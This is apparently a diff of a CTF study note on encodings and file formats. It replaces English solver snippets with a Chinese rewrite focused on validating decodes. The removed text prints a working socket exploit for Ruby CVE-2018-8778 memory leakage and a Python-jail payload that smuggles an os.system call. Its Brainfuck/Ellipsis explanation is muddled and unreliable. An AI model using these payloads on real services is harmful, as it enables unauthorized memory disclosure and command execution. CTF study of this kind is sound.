@@ -1,561 +1,117 @@
-# CTF Misc - Advanced Encodings & Specialized Formats
-
-## Table of Contents
-- [Verilog/HDL](#veriloghdl)
-- [Gray Code Cyclic Encoding (EHAX 2026)](#gray-code-cyclic-encoding-ehax-2026)
-- [Binary Tree Key Encoding](#binary-tree-key-encoding)
-- [RTF Custom Tag Data Extraction (VolgaCTF 2013)](#rtf-custom-tag-data-extraction-volgactf-2013)
-- [SMS PDU Decoding and Reassembly (RuCTF 2013)](#sms-pdu-decoding-and-reassembly-ructf-2013)
-- [Automated Multi-Encoding Sequential Solver (HackIM 2016)](#automated-multi-encoding-sequential-solver-hackim-2016)
-- [RFC 4042 UTF-9 Decoding (SECCON 2015)](#rfc-4042-utf-9-decoding-seccon-2015)
-- [Pixel Color Binary Encoding (Break In 2016)](#pixel-color-binary-encoding-break-in-2016)
-- [Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)](#hexadecimal-sudoku--qr-assembly-bsidessf-2026)
-- [TOPKEK Binary Encoding (Hack The Vote 2016)](#topkek-binary-encoding-hack-the-vote-2016)
-- [MaxiCode 2D Barcode Decoding (CSAW CTF 2016)](#maxicode-2d-barcode-decoding-csaw-ctf-2016)
-- [DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)](#dtmf-audio-with-multi-tap-phone-keypad-decoding-h4ckc0n-2017)
-- [Music Note Interval Steganography (DefCamp 2017)](#music-note-interval-steganography-defcamp-2017)
-- [Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)](#ruby-arrayunpack-buffer-under-read-cve-2018-8778-codegate-2019)
-- [Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)](#binary-grid-text-to-qr-image--xor-key-pragyan-ctf-2019)
-
+---
+title: 高级编码与专用格式判定
+phase: misc
+vuln_class: [encoding, binary-format, barcode, audio, steganography, parser-security]
+summary: 高级编码题先验证数据结构和边界，再选择解码器；候选解码必须能通过 magic、长度、校验或已知明文复核，不能把“函数没报错”当作解码成功。
 ---
 
-## Verilog/HDL
+# 高级编码与专用格式判定
+
+基础编码、压缩 magic、QR、Whitespace 与 Brainfuck 见 [[misc/编码解码/encodings.md|编码与解码基础]]；图像隐写见 [[forensics/隐写与信号/stego-image.md|图像隐写]]；音频信号与频谱见 [[forensics/隐写与信号/signals-and-hardware.md|信号与硬件取证]]。
+
+## 0. 判据速查
+
+| 输入特征 | 优先验证 | 常见误判 |
+|---|---|---|
+| 多层编码，解码链不明 | 每层输出类型、magic、长度变化 | 自动解码器取第一个“不报错”的结果 |
+| 固定宽度图像或位图 | 像素通道、阈值、行列序、位序 | 只试一种颜色阈值和大小端 |
+| 多个 QR/条码 | 先独立解码，再看分片序号和纠错 | 把码面排列顺序当数据顺序 |
+| RTF/XML/容器文件 | 解析结构、保留未知字段与偏移 | 只看渲染器显示内容 |
+| SMS PDU/二进制协议 | UDH、长度字段、分段序号 | 固定偏移抽取，不解析头部 |
+| 音乐/DTMF | 先恢复音符或频率，再推断符号映射 | 直接凭听感读字符串 |
+| 格雷码/树路径 | 检查汉明距离或父子索引关系 | 将 Gray 值当普通二进制计数 |
+| Verilog/HDL | 翻译位宽、截断、signed 与移位语义 | 用无限精度整数替代硬件位宽 |
+
+## 1. 多层解码：逐层保留 bytes
+
+自动探测器只能生成候选，不能替人判断。先识别常见 magic，再按格式调用对应库：
+
+| 格式 | 常见开头 |
+|---|---|
+| gzip | `1f 8b` |
+| zlib | 常见 `78 01`、`78 9c`、`78 da`（需校验头字段） |
+| bzip2 | `BZh` |
+| xz | `fd 37 7a 58 5a 00` |
+| ZIP | `PK\x03\x04` |
+| PNG | `89 50 4e 47 0d 0a 1a 0a` |
+
+每层输出保留为 `bytes`，记录算法、输入/输出长度和 hash；只有确认文本编码后才 decode：
 
 ```python
-# Translate Verilog logic to Python
-def verilog_module(input_byte):
-    wire_a = (input_byte >> 4) & 0xF
-    wire_b = input_byte & 0xF
-    return wire_a ^ wire_b
+raw = data if isinstance(data, bytes) else data.encode("ascii")
 ```
 
----
+base64/base32/hex 要启用严格校验；base64 解码可容忍空白，但应拒绝非法字符。二进制字符串须满足长度是 8 的倍数（或明确记录 padding）；不满足时分别尝试 MSB-first/LSB-first，并用 magic、字符分布或校验和筛选。不要使用 `errors="replace"`，它会把不可逆损坏伪装成可读文本。
 
-## Gray Code Cyclic Encoding (EHAX 2026)
+当多个解码器都“成功”时比较候选的结构证据：文件头、声明长度、校验和、熵变化、已知前缀和后续可解析性。明确记录失败原因，避免反复尝试同一无效层。
 
-**Pattern (#808080):** Web interface with a circular wheel (5 concentric circles = 5 bits, 32 positions). Must fill in a valid Gray code sequence where consecutive values differ by exactly one bit.
+## 2. 位序、Gray code 与树索引
 
-**Gray code properties:**
-- N-bit Gray code has 2^N unique values
-- Adjacent values differ by exactly 1 bit (Hamming distance = 1)
-- The sequence is **cyclic** — rotating the start position produces another valid sequence
-- Standard conversion: `gray = n ^ (n >> 1)`
+Gray code 相邻项只改变一位，标准二进制转 Gray 为：
 
 ```python
-# Generate N-bit Gray code sequence
-def gray_code(n_bits):
-    return [i ^ (i >> 1) for i in range(1 << n_bits)]
-
-# 5-bit Gray code: 32 values
-seq = gray_code(5)
-# [0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8, ...]
-
-# Rotate sequence by k positions (cyclic property)
-def rotate(seq, k):
-    return seq[k:] + seq[:k]
-
-# If decoded output is ROT-N shifted, rotate the Gray code start by N positions
-rotated = rotate(seq, 4)  # Shift start by 4
+gray = n ^ (n >> 1)
 ```
 
-**Key insight:** If the decoded output looks correct but shifted (e.g., ROT-4), the Gray code start position needs cyclic rotation by the same offset. The cyclic property guarantees all rotations remain valid Gray codes.
+解码 Gray 值可逐位异或前缀；验证整个序列唯一，且相邻值（含首尾，若题目声称循环）汉明距离为 1。圆盘/同心环图通常每条轨道是一位，先确认内外圈对应的 bit 权重，再检查旋转起点。
 
-**Wheel mapping:** Each concentric circle = one bit position. Innermost = bit 0, outermost = bit N-1. Read bits at each angular position to build N-bit values.
+二叉树路径若规则为左子 `j=2j+1`、右子 `j=2j+2`，反向解码时每一步根据索引奇偶恢复边，再回到父节点；根索引与编号是否从 0 开始必须由样例验证。不要把该规则套到 heap 的 1-based 编号上。
 
----
+## 3. 图像像素、二维码与多格式文件
 
-## Binary Tree Key Encoding
+窄图可能将每行像素编码为 7/8 位字符。对 RGB/RGBA 分别统计通道和值域，测试行优先/列优先、左到右/右到左、阈值两侧与 7-bit/8-bit；输出必须有合理字符分布，必要时先检查调色板和 alpha。
 
-**Encoding:** `'0' → j = j*2 + 1`, `'1' → j = j*2 + 2`
+多个二维码应先逐个解码，再根据内容中的索引、总片数或协议头排序。QR 中解出的十六进制仍是字节串，继续 XOR 前先验证长度与重复密钥假设。把二进制栅格渲染成图时，依据总 bit 数和题面线索确定宽高；尝试常见 QR 尺寸之前检查 finder pattern，不要仅凭“能扫码”认定尺寸正确。
 
-**Decoding:**
-```python
-def decode_path(index):
-    path = ""
-    while index != 0:
-        if index & 1:  # Odd = left ('0')
-            path += "0"
-            index = (index - 1) // 2
-        else:          # Even = right ('1')
-            path += "1"
-            index = (index - 2) // 2
-    return path[::-1]
-```
-
----
-
-## RTF Custom Tag Data Extraction (VolgaCTF 2013)
-
-**Pattern:** Data hidden inside custom RTF control sequences (e.g., `{\*\volgactf412 [DATA]}`). Extract numbered blocks, sort by index, concatenate, and base64-decode.
-
-```python
-import re, base64
-
-rtf = open('document.rtf', 'r').read()
-# Extract custom tags: {\*\volgactf<N> <DATA>}
-blocks = re.findall(r'\{\\\*\\volgactf(\d+)\s+([^}]+)\}', rtf)
-blocks.sort(key=lambda x: int(x[0]))  # Sort by numeric index
-payload = ''.join(data for _, data in blocks)
-flag = base64.b64decode(payload)
-```
-
-**Key insight:** RTF files support custom control sequences prefixed with `\*` (ignorable destinations). Malicious or challenge data hides in these ignored fields — standard RTF viewers skip them. Look for non-standard `\*\` tags with `grep -oP '\\\\\\*\\\\[a-z]+\d*' document.rtf`.
-
----
-
-## SMS PDU Decoding and Reassembly (RuCTF 2013)
-
-**Pattern:** Intercepted hex strings are GSM SMS-SUBMIT PDU (Protocol Data Unit) frames. Concatenated SMS messages require UDH (User Data Header) reassembly by sequence number.
-
-```python
-from smspdu import SMS_SUBMIT
-
-# Read PDU hex strings (one per line)
-pdus = [line.strip() for line in open('sms_intercept.txt')]
-
-# Sort by concatenation sequence number (bytes 38-40 in hex)
-pdus.sort(key=lambda pdu: int(pdu[38:40], 16))
-
-# Extract and concatenate user data
-payload = b''
-for pdu in pdus:
-    sms = SMS_SUBMIT.fromPDU(pdu[2:], '')  # Skip first byte (SMSC length)
-    payload += sms.user_data.encode() if isinstance(sms.user_data, str) else sms.user_data
-
-# Payload is often base64 — decode to get embedded file
-import base64
-with open('output.png', 'wb') as f:
-    f.write(base64.b64decode(payload))
-```
-
-**Key insight:** SMS PDU format: `0041000B91` prefix identifies SMS-SUBMIT. UDH field at bytes 29-40 contains `05000301XXYY` where XX=total parts, YY=sequence number. Install `smspdu` library (`pip install smspdu`) for automated parsing. Output is often a base64-encoded image — use reverse image search to identify the subject.
-
----
-
-## Automated Multi-Encoding Sequential Solver (HackIM 2016)
-
-Some challenges require decoding 25+ sequential layers of different encodings. Build an automated decoder:
-
-```python
-import base64, zlib, gzip, bz2, lzma, codecs
-
-def auto_decode(data):
-    """Try each encoding and return first successful decode"""
-    decoders = [
-        ('base64', lambda d: base64.b64decode(d)),
-        ('base32', lambda d: base64.b32decode(d)),
-        ('base16', lambda d: base64.b16decode(d.upper())),
-        ('zlib',   lambda d: zlib.decompress(d if isinstance(d, bytes) else d.encode())),  # 78 01 / 78 9c
-        ('gzip',   lambda d: gzip.decompress(d if isinstance(d, bytes) else d.encode())),  # 1f 8b
-        ('bz2',    lambda d: bz2.decompress(d if isinstance(d, bytes) else d.encode())),   # BZh
-        ('lzma',   lambda d: lzma.decompress(d if isinstance(d, bytes) else d.encode())),  # fd 37 7a 58 5a 00
-        ('rot13',  lambda d: codecs.decode(d, 'rot_13')),
-        ('hex',    lambda d: bytes.fromhex(d if isinstance(d, str) else d.decode())),
-        ('binary', lambda d: bytes(int(d[i:i+8], 2) for i in range(0, len(d.strip()), 8))),
-        ('ebcdic', lambda d: d.decode('cp500') if isinstance(d, bytes) else d.encode().decode('cp500')),
-    ]
-
-    for name, decoder in decoders:
-        try:
-            result = decoder(data)
-            if result and len(result) > 0:
-                return name, result
-        except:
-            continue
-    return None, data
-
-# Chain decoder
-data = initial_input
-for i in range(50):  # Max layers
-    name, data = auto_decode(data)
-    if name is None:
-        break
-    print(f"Layer {i}: {name}")
-```
-
-Add Brainfuck detection (presence of `+-<>[].,` characters only) and other esoteric languages as needed.
-
-### QR Polyglot Workflow — PNG/JAR/ZIP Overlap
-
-**Pattern:** A `.png` that is also a valid ZIP/JAR (polyglot). `file` reports multiple types, QR remains decodable but hides appended archive data after `IEND`.
-
-**Workflow:**
-```bash
-file polyglot.png              # e.g. "PNG image data, Zip archive data"
-binwalk polyglot.png           # list embedded files/offsets
-pngcheck -v polyglot.png       # verify chunks, show trailing bytes after IEND
-7z l polyglot.png              # list archive contents even with PNG header
-# extract appended ZIP/JAR — prefer archive-aware extraction:
-binwalk -e polyglot.png        # carve by signature (robust)
-7z x polyglot.png -oout/       # 7z scans for central directory (robust)
-# NOTE: `tail -c` after IEND is fragile — it assumes the payload starts at a
-# fixed offset past the IEND marker and breaks on stray chunks, ancillary data,
-# or non-appended (interleaved) polyglots. Prefer `binwalk -e` / `7z x` above.
-# Last-resort manual carve only:
-# tail -c +$(($(grep -aob IEND polyglot.png | tail -1 | cut -d: -f1)+8)) polyglot.png > hidden.zip
-
-# LSB / bit-plane stego inside QR PNG
-zsteg -a polyglot.png          # check all bit planes
-zsteg --all polyglot.png
-zsteg -E b1,r,msb,xy polyglot.png  # brute bit planes
-```
-
-**Key insight:** Valid QR polyglots abuse PNG's `IEND` as logical EOF — decoders stop at `IEND` but ZIP readers scan for `PK` end-of-central-directory anywhere in file. Always run `pngcheck` + `7z l` + `tail after IEND` + `zsteg bit planes` on QR images that `file`/`binwalk` flags as multi-format.
-
-**References:**
-- MDPI Applied Sciences — QR suboptimal / error-correction capacity analysis showing QR masks hide polyglot payloads (`MDPI` QR suboptimal)
-- arXiv  — polyglot / stego-in-image survey and PNG chunk abuse (`arxiv polyglot`)
-
----
-
-### Brainfuck Dual-Interpreter — bf_eval==eval Equality Craft via Ellipsis
-
-**Pattern:** Restricted Python where `eval` is filtered but `bf_eval` (or similar Brainfuck interpreter) is exposed; `bf_eval` internally calls `eval` after Brainfuck execution. Craft payload so `bf_eval(code) == eval(code)` to smuggle Python through the Brainfuck path.
-
-**Technique:** Use `...` (`Ellipsis`) object — `...` is a singleton that evaluates truthily and is syntactically valid in both interpreters. Pad Brainfuck code with `...` to make both interpreters return the same value:
-
-```python
-# Ellipsis craft — bf_eval==eval equality
-# In Python: ... == Ellipsis, and ... is truthy / ignored in some contexts
-# In BF: `...` are treated as no-ops/comments (non-BF chars ignored)
-
-payload = "..." + bf_code + "..."  # bf_eval ignores ... ; eval sees Ellipsis tuple padding
-assert bf_eval(payload) == eval(payload)  # equality gate bypass
-
-# Example: execute os.system via bf_eval which wraps eval
-bf_payload = "..." + ",[.,]" + "..."  # BF no-op padding via Ellipsis
-# If bf_eval does: return eval(bf_interpret(code))
-# then bf_interpret("...") == "" -> eval("") fallback, but "..." as Python is Ellipsis
-# Use: bf_eval("...;__import__('os').system('id')") == eval("...;__import__('os').system('id')")
-```
-
-**Key insight:** Dual-interpreter jails compare `bf_eval(x) == eval(x)` to allow only "pure Brainfuck" inputs. `...` (`Ellipsis`) bridges the gap because Brainfuck ignores non-`+-<>[].,` characters while Python evaluates `...` as a valid constant — craft with `...` prefix/suffix so both sides produce identical output and bypass the equality check.
-
----
-
-## RFC 4042 UTF-9 Decoding (SECCON 2015)
-
-RFC 4042 (April Fools' RFC) defines UTF-9, a 9-bit encoding for Unicode on systems with 9-bit bytes:
-
-- Each 9-bit "byte" has a continuation bit (MSB): 1 = more bytes follow, 0 = last byte
-- Lower 8 bits contain character data
-- Multi-byte sequences concatenate the 8-bit portions
-
-```python
-def decode_utf9(data_bits):
-    """Decode UTF-9 from a bitstring"""
-    chars = []
-    i = 0
-    while i < len(data_bits):
-        # Read 9-bit units until continuation bit is 0
-        codepoint_bits = ''
-        while i + 9 <= len(data_bits):
-            continuation = int(data_bits[i])
-            codepoint_bits += data_bits[i+1:i+9]
-            i += 9
-            if continuation == 0:
-                break
-        if codepoint_bits:
-            chars.append(chr(int(codepoint_bits, 2)))
-    return ''.join(chars)
-
-# Convert octal/hex input to binary first
-binary_string = bin(int(octal_data, 8))[2:]
-result = decode_utf9(binary_string)
-```
-
-**Key insight:** Look for "4042" or "UTF-9" in challenge descriptions. The April Fools' RFC series (RFC 1149, 2549, 4042) occasionally appears in CTFs.
-
----
-
-## Pixel Color Binary Encoding (Break In 2016)
-
-Narrow images (7-8 pixels wide) may encode ASCII characters as binary pixel rows:
-
-```python
-from PIL import Image
-
-img = Image.open('challenge.png')
-pixels = img.load()
-width, height = img.size
-
-text = ''
-for y in range(height):
-    bits = ''
-    for x in range(width):
-        r, g, b = pixels[x, y][:3]
-        # Red pixel = 1, Black pixel = 0 (or white=1, black=0)
-        bits += '1' if r > 128 else '0'
-
-    # Pad to 8 bits if needed (7-pixel-wide images)
-    if len(bits) == 7:
-        bits = '0' + bits  # Prepend leading zero
-
-    text += chr(int(bits, 2))
-
-print(text)
-```
-
-**Key insight:** Image width of 7 or 8 pixels strongly suggests binary character encoding (7-bit ASCII or 8-bit). Check both color channels and brightness thresholds.
-
----
-
-### Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)
-
-**Pattern (hexhaustion):** Flag is encoded across 4 QR codes, each containing one quadrant of a 16x16 hexadecimal Sudoku grid. Solve the Sudoku, read the main diagonal values as hex pairs, convert to ASCII for the flag.
-
-**Solving steps:**
-
-1. **Scan QR codes:** Use `zbarimg` or `pyzbar` to decode all 4 QR codes
-2. **Assemble grid:** Each QR contains a quadrant (8x8) with hex values (0-F) and blanks
-3. **Solve the 16x16 Sudoku:** Standard Sudoku rules apply with hex digits (0-F) — each row, column, and 4x4 box contains each digit exactly once
-4. **Extract flag:** Read diagonal values `grid[i][i]` for i=0..15, pair into bytes, decode as ASCII
-
-```python
-from itertools import product
-
-def solve_hex_sudoku(grid):
-    """Solve 16x16 Sudoku with hex digits 0-F using backtracking."""
-    digits = set(range(16))
-
-    def possible(r, c):
-        used = set()
-        used.update(grid[r])              # Row
-        used.update(grid[i][c] for i in range(16))  # Column
-        br, bc = (r // 4) * 4, (c // 4) * 4  # 4x4 box
-        for i, j in product(range(br, br+4), range(bc, bc+4)):
-            used.update({grid[i][j]})
-        used.discard(-1)  # -1 = blank
-        return digits - used
-
-    def solve():
-        for r, c in product(range(16), range(16)):
-            if grid[r][c] == -1:
-                for d in possible(r, c):
-                    grid[r][c] = d
-                    if solve():
-                        return True
-                    grid[r][c] = -1
-                return False
-        return True
-
-    solve()
-    return grid
-
-# Read diagonal and convert to ASCII
-solved = solve_hex_sudoku(grid)
-diag_hex = ''.join(format(solved[i][i], 'X') for i in range(16))
-flag = bytes.fromhex(diag_hex).decode('ascii')
-print(flag)  # e.g., "HYPOAXIS"
-```
-
-**Key insight:** The QR codes serve as both a distribution mechanism (splitting the puzzle into 4 pieces) and a data encoding layer. The actual flag encoding is in the Sudoku solution's diagonal values interpreted as hex bytes.
-
-**When to recognize:** Challenge distributes multiple QR codes, mentions "hex", "nibbles", or "16x16 grid". QR content contains hex characters with blanks/underscores.
-
-**References:** BSidesSF 2026 "hexhaustion"
-
----
-
-### TOPKEK Binary Encoding (Hack The Vote 2016)
-
-Custom binary encoding where `KEK` represents bit 0 and `TOP` represents bit 1. Exclamation marks indicate bit repetition count.
-
-```python
-def decode_topkek(encoded):
-    """Decode TOPKEK encoding: KEK=0, TOP=1, !=repeat count"""
-    tokens = encoded.split()
-    bits = ""
-
-    for token in tokens:
-        # Count exclamation marks (repeat count = len - 3)
-        base = token.replace('!', '')
-        repeats = len(token) - len(base)
-        if repeats == 0:
-            repeats = 1
-
-        if base == "KEK":
-            bits += "0" * repeats
-        elif base == "TOP":
-            bits += "1" * repeats
-
-    # Convert bit string to ASCII
-    message = ""
-    for i in range(0, len(bits), 8):
-        byte = bits[i:i+8]
-        if len(byte) == 8:
-            message += chr(int(byte, 2))
-
-    return message
-
-# Example: "KEK! TOP!! KEK TOP!"
-# = "0" + "11" + "0" + "1" = "0110 1..."
-```
-
-**Key insight:** TOPKEK is a CTF-specific encoding. Recognize it by the pattern of `TOP`/`KEK` words with varying numbers of `!` suffixes. Each `!` adds one repetition of the corresponding bit value. Decode to binary, then group into 8-bit bytes for ASCII.
-
----
-
-### MaxiCode 2D Barcode Decoding (CSAW CTF 2016)
-
-MaxiCode is a hexagonal 2D barcode used by UPS, occasionally found in CTF forensics challenges.
+PNG/JAR/ZIP polyglot：PNG 解码器通常在 `IEND` 后停止，而 ZIP 解析器可在文件尾搜索中央目录。检查多格式识别、PNG chunk 边界与 ZIP 目录：
 
 ```bash
-# Identify MaxiCode: distinctive bullseye center pattern
-# with hexagonal dot matrix (unlike QR's square modules)
-
-# Decode using zxing library:
-# Online: https://zxing.org/w/decode.jspx (upload image)
-
-# Python — prefer zxing-cpp (pyzbar/ZBar does not support MaxiCode):
-# pip install zxing-cpp Pillow
-python3 -c "
-import zxingcpp
-from PIL import Image
-results = zxingcpp.read_barcodes(Image.open('maxicode.gif'))
-for r in results: print(r.format, r.text)
-"
-
-# Java zxing command-line:
-java -cp javase.jar:core.jar com.google.zxing.client.j2se.CommandLineRunner maxicode.gif
-
-# Alternative: use online decoders
-# - https://products.aspose.app/barcode/recognize
-# - https://www.onlinebarcodereader.com/
+file polyglot.png
+binwalk polyglot.png
+pngcheck -v polyglot.png
+7z l polyglot.png
 ```
 
-**Key insight:** MaxiCode has a distinctive bullseye center (3 concentric circles) surrounded by a hexagonal grid. Standard QR decoders won't read it. Use zxing (Java) which supports MaxiCode natively, or online barcode decoders. MaxiCode is found in shipping labels, CTF forensics disk images, and embedded in other files.
+优先使用 `binwalk` 或归档工具提取；按固定偏移从 `IEND` 后切割容易受额外 chunk、尾随字节或交错 polyglot 影响。对 QR PNG 另行检查 LSB/bit-plane，但不要把格式尾随数据与像素隐写混为一类。
 
----
+MaxiCode 使用中心靶心与六角点阵，普通 QR 解码器不支持；使用支持 MaxiCode 的 ZXing/zxing-cpp，并核对返回的条码格式。
 
-### DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)
+## 4. 结构化文档与协议载荷
 
-**Pattern:** Audio file contains DTMF telephone keypad tones. This is a two-layer encoding: first decode tones to a digit sequence, then decode grouped digits as multi-tap phone keypad input (repeated presses select letters).
+### 4.1 RTF 自定义目的地
 
-**Step 1 — Decode DTMF tones to digits:** Use Audacity's spectrogram view or an online DTMF decoder to identify tone pairs. Pauses/gaps indicate word or group boundaries.
+RTF 的 `\*` ignorable destination 可能被查看器忽略，但仍在原始字节中。先按大括号层级和转义规则解析，再抽取非标准 destination；若用正则，必须覆盖转义花括号和跨行内容。编号块按数值排序后拼接，拼接结果再做严格 base64/文件头验证。
 
-**Step 2 — Decode multi-tap keypad:** Group digits by their key press sequences, then map to letters:
+### 4.2 SMS PDU 分片
 
-```python
-# Multi-tap decode mapping
-T9 = {
-    '2':'a',  '22':'b',  '222':'c',
-    '3':'d',  '33':'e',  '333':'f',
-    '4':'g',  '44':'h',  '444':'i',
-    '5':'j',  '55':'k',  '555':'l',
-    '6':'m',  '66':'n',  '666':'o',
-    '7':'p',  '77':'q',  '777':'r', '7777':'s',
-    '8':'t',  '88':'u',  '888':'v',
-    '9':'w',  '99':'x',  '999':'y', '9999':'z',
-}
+SMS PDU 不能依靠整串固定字符偏移拆分：先解析 SMSC 长度、TPDU 类型、地址、DCS、UDL 与 UDH。拼接短信从 UDH 读取 concat reference、总片数和序号，按序号重组并确认片数完整；之后再识别 septet、UCS-2 或二进制 user data。编码类型决定长度单位，TP-UDL 对 GSM 7-bit 不是简单字节数。
 
-def decode_multitap(groups):
-    """groups: list of strings like ['444', '88', '2', ...]"""
-    return ''.join(T9.get(g, '?') for g in groups)
-```
+### 4.3 Verilog/HDL 翻译
 
-**Key insight:** Two-layer encoding — DTMF tones encode digits, then digit sequences use multi-tap phone keypad mapping. Use Audacity's spectrogram to identify pause positions for grouping boundaries. Each same-digit run maps to one letter; a pause separates distinct keypresses on the same digit key.
+将逻辑翻译到 Python 时显式模拟位宽截断、无符号/有符号转换、拼接、切片和阻塞赋值；每个中间量都限制宽度。先用少量输入向量对照仿真器，确认真值表后再批量处理输入。对 `>>>`、`>>`、溢出和 X/Z 状态需分别定义语义，不能用普通整数运算默默近似。
 
----
+## 5. 音频符号：先测信号，再建映射
 
-### Music Note Interval Steganography (DefCamp 2017)
+### DTMF 与多按键输入
 
-**Pattern:** An MP3 is transcribed to musical notes. The flag is encoded as pairs of notes where each note maps to a nibble (4 bits) based on its position (scale degree) in the D major scale. Two nibbles combine to form one byte/character.
+DTMF 每个符号是一个低频组与一个高频组的组合。用频谱图或检测器得到频率对和持续时间，验证是否落在标准行列频率附近；暂停用于区分字符或单词。之后再测试多按键手机键盘映射，同一数字连续按压通常需要时间间隔作为分隔，不能把一串数字直接按字符映射。
 
-**Encoding scheme:**
-- D major scale degrees 0–7 map to nibble values 0–7 (3-bit nibble) or 0–15 (4-bit nibble) depending on variant
-- Each pair of consecutive notes encodes one character: `(note1 << 4) | note2`
-- Known flag prefix/suffix (e.g., `CTF{...}`) at start/end reveals the alphabet mapping
+### 音符间隔
 
-**Recovery approach:**
+先从音频恢复基频/音高和节拍，再判断编码取绝对音高、音程、音阶级数还是时值。以已知明文（如 flag 前缀）拟合映射后，用剩余位置验证；若规则只能解释前缀，说明假设不充分。音符成对映字节时需确认半音、升降号、八度归一化与 nibble 范围。
 
-```python
-# Example: D major scale degree → nibble value
-# D=0, E=1, F#=2, G=3, A=4, B=5, C#=6, D(octave)=7
-scale = {'D': 0, 'E': 1, 'F#': 2, 'G': 3, 'A': 4, 'B': 5, 'C#': 6}
+## 6. 特殊编码与约束求解
 
-notes = ['A', 'D', 'G', 'E', ...]  # transcribed from audio
+UTF-9 是 RFC 4042 中的玩笑性 9-bit 字符编码：每个 9-bit 单元含一个 continuation bit 和 8 个数据位。实现时先确认输入位流的对齐与结束条件；不足 9 bit 的尾部必须报错或按题目明确的 padding 处理，不能直接丢弃。由八进制/十六进制转位串时保留前导零，否则字节边界会错位。
 
-chars = []
-for i in range(0, len(notes) - 1, 2):
-    hi = scale[notes[i]]
-    lo = scale[notes[i+1]]
-    chars.append(chr((hi << 4) | lo))
+16×16 hex Sudoku 若每行、每列和每个 4×4 宫各含 `0..F` 一次，可用约束求解器或回溯。每次填值后立即验证约束；提取对角线、行列或指定路径前，先从题目描述确认读出顺序。解出的 16 个 hex nibble 组成 8 字节，不应误按 16 字符 ASCII 解释。
 
-print(''.join(chars))
-```
+TOP/KEK 等自定义文本编码，先根据 token 明确位值，再处理标点是否表示重复次数；所有 token 都应被识别，位数须满足预期分组。例题或赛事名称可作线索，但不是编码规范。
 
-**Key insight:** Known plaintext at the start and end (flag format like `CTF{` and `}`) reveals the encoding alphabet — map the known characters back to their note pairs to confirm the scale-degree assignment. Musical scale degree = nibble value; pairs of notes = one byte.
+## 7. 解析器安全边界
 
----
+遇到 Ruby `pack/unpack`、格式串或其他二进制解析器时，应把“攻击利用”与“安全分析”分开：核实运行时版本、输入是否进入格式参数、边界检查和异常处理；优先在隔离环境使用官方补丁版本复现非破坏性测试。不要对未授权远程服务发送越界/内存读取 payload。报告应说明受影响版本、根因、修复版本和可验证的安全测试，不记录可直接用于泄露进程内存的利用串。
 
-## Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)
+## 8. 纪律
 
-**Pattern:** A Ruby service calls `String#unpack` (or `Array#pack`) with an attacker-controlled format string. On pre-2.5.1 Ruby, oversized `@N` offsets are compared with signed integers, so a huge N wraps to a negative pointer offset — `unpack` then reads bytes from memory *before* the string's buffer and emits them as integers. Combined with the common bug of putting user input inside the format (e.g. `input.unpack("C*#{input}.length")`), you get an arbitrary memory dump primitive.
-
-```python
-# Remote Ruby server evaluates: input.unpack("C*#{input}.length")
-# Supplying "@HUGECHUNK1200000" as input builds format "C*@HUGECHUNK1200000.length"
-# which unpack parses as: @<offset> C<count> -> read <count> bytes from far offset.
-import socket
-payload = b'@18446744073708351616C1200000\n1\n'   # 2**64 - 0x1C0000
-s = socket.create_connection(('target', 12137))
-s.sendall(payload)
-data = b''
-while True:
-    chunk = s.recv(4096)
-    if not chunk:
-        break
-    data += chunk
-
-# Each emitted line is one int (byte value from leaked memory)
-import string
-out = ''.join(
-    chr(int(line)) for line in data.decode(errors='ignore').splitlines()
-    if line.strip().isdigit() and chr(int(line)) in string.printable
-)
-import re
-print(re.findall(r'FLAG\{[^}]*\}', out))
-```
-
-**Key insight:** `String#unpack` is not inherently unsafe — it becomes catastrophic when (a) the format string is attacker-controlled (format-injection pattern, equivalent to `printf` bugs), and (b) the Ruby runtime is pre-2.5.1 (CVE-2018-8778). Huge `@N` offsets leak arbitrary memory. Always audit Ruby services that interpolate user input into `pack`/`unpack`/`sprintf` templates.
-
-**References:** Codegate CTF 2019 Preliminary — mini converter, writeup 13209
-
----
-
-## Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)
-
-**Pattern:** A text file contains only `0` and `1` characters (often one per line or with random line breaks). Strip whitespace, verify the length is a perfect square (or a known W*H), render as a pixel grid, and decode with `pyzbar`. The QR payload is hex-encoded and must be XORed with a repeating key (commonly `flag` or the challenge name) to reveal the flag.
-
-```python
-from PIL import Image, ImageDraw
-from pyzbar.pyzbar import decode
-
-raw = open('01qr').read()
-bits = ''.join(c for c in raw if c in '01')
-# Guess dimensions
-import math
-n = int(math.isqrt(len(bits)))
-assert n * n == len(bits), f'not square: {len(bits)}'
-
-scale = 5
-img = Image.new('RGB', (n * scale, n * scale), (255, 255, 255))
-d = ImageDraw.Draw(img)
-for i in range(n):
-    for j in range(n):
-        if bits[i * n + j] == '0':           # 0 == black in this challenge
-            d.rectangle((j*scale, i*scale,
-                         j*scale + scale, i*scale + scale), fill=(0, 0, 0))
-img.save('qr.png')
-
-hexstr = decode(img)[0].data.decode()
-ct = bytes.fromhex(hexstr)
-key = b'flag'
-pt = bytes(b ^ key[i % len(key)] for i, b in enumerate(ct))
-print(pt)
-```
-
-**Key insight:** Binary-grid text files are often "render me" puzzles — one pixel per bit, scale by 4-8x so `zbarimg`/`pyzbar` can find the finder patterns. If the decoded bytes are printable-ish but nonsense (e.g. `9YQ8S_VY^`), try short repeating-key XOR with the word `flag`, the CTF name, or `ctf{` — XORing the first 5 bytes of ciphertext with `pctf{` recovers the key immediately.
-
-**References:** Pragyan CTF 2019 — EXORcism, writeup 13835
+每种解码都要保留原始输入与中间层；候选结果至少通过一项独立结构校验。对音频、图像和协议载荷先恢复测量值，再推断符号映射。遇到自定义格式，先找长度、序号、校验和及边界，再写解析器；不要用题目名称替代格式证据。
